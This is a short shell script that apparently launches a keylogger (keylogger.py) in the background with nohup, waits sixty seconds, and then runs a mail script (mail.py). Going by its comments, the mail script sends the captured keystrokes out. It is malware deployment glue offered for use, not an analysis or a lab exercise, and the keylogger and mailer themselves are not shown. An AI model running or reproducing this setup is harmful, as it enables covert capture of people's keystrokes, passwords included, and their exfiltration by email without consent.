#run files in background using & command
nohup python3 keylogger.py &
# timelapse used to send mail after 60 seconds
sleep 60
nohup python3 mail.py &
# combining files to run parallelly
